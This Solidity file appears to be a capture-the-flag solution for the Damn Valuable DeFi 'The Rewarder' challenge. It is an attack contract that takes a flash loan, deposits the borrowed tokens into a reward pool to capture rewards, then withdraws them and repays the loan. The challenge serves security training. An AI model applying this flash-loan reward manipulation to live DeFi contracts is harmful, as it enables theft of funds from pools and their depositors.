// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract AttackTheRewarder {
    DamnValuableToken public liquidityToken;
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public pool;

    constructor(
        address liquidityTokenAddress,
        address rewarderPoolAddress,
        address flashLoanerPoolAddress
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        pool = FlashLoanerPool(flashLoanerPoolAddress);
    }

    function receiveFlashLoan(uint256 amount) public {
        // called by the FlashLoanerPool
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);
    }

    function takeFlashLoan(uint256 amount) public {
        pool.flashLoan(amount);
    }
}
